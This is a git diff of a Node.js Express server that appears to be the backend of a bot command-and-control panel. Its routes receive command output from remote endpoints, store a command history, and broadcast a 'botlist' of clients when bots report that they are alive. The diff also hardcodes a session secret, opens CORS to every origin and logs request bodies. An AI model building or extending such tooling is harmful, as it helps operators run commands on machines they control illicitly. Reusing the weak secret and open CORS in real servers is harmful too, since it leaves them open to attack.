@@ -4,13 +4,13 @@ const https = require('https');
 const http = require('http');
 const fetch = require('node-fetch');
 const ws = require('ws');
-const db = require('../database/config.js');
-const collections = ['client', 'comanda', 'user'];
 var bodyParser = require('body-parser')
 var jsonParser = bodyParser.json()
 var urlencodedParser = bodyParser.urlencoded({ extended: false })
 const path = require('path');
 const cors = require('cors');
+const db = require('../database/config.js');
+const collections = ['client', 'comanda', 'user'];
 const {parseBinary} = require('./helpers/parseBinary');
 const passport = require('passport');
 const session = require('express-session');
@@ -66,8 +66,10 @@ function startBackend(){
 
     });
 
+    
+
     // Middlewares
-    app.use(cors());
+    app.use(cors({ origin: '*', optionsSuccessStatus: 200 }));
     app.use(express.static(path.join(__dirname + '/../../public')));
     app.use(session({
         secret: 'mysecretsession',
@@ -80,6 +82,17 @@ function startBackend(){
     app.get('/consolelog', (req, res)=>{
         console.log("Esto se ejecuta en la consola del servidor");
     });
+    app.get('/gethistory', (req, res)=>{
+        db.connect( async (err) =>{ //input a la BBDD del output del comando
+            var cmdColl = await db.getColl(collections[1])
+            await db.getDocuments(cmdColl, {}).then((doc) =>{
+                var commands = doc
+                res.send(commands)
+                console.log(commands)
+            })
+        })
+    })
+    
     app.post('/outputback', jsonParser, (req, res)=>{//comando=req.body.cmd, output=req.body.output, endpoint=req.body.endp
         console.log(`rebut:\ncomando:${req.body.cmd}\n${req.body.output}endpoint:${req.body.endp}`);
         wss.clients.forEach( async (client) => {
@@ -113,11 +126,29 @@ function startBackend(){
         console.log("Console log fora del fetch:", resdata)
         res.send(resdata)
     })
+    app.post('/status', jsonParser, async (req, res) =>{
+        try {
+            if(req.body.alive){
+                wss.clients.forEach( async (client) => {
+                    if (client.readyState === ws.OPEN) {
+                        var clientdb = db.getColl(collections[0]);
+                        db.getDocuments(clientdb, {}).then( (doc, err) => {
+                            const binaryRes = parseBinary("botlist: " + JSON.stringify(doc));
+                            client.send(binaryRes)
+                        });   
+                    }
+                  });
+            }
+        } catch (error) {
+            console.log(error)
+        }
+    })
     // Login
-    app.post('/signin', passport.authenticate('local-signin'));
+    app.post('/signin',jsonParser, passport.authenticate('local-login'));
 
-    app.get('*', (req,res) =>{
+    app.get('*', (req, res) =>{
         res.sendFile(path.join(__dirname+'/../../public/index.html'));
+        console.log(req.body)
     });
     server.listen(port, () => {
         console.log(`Server started on port ${server.address().port} :)`);
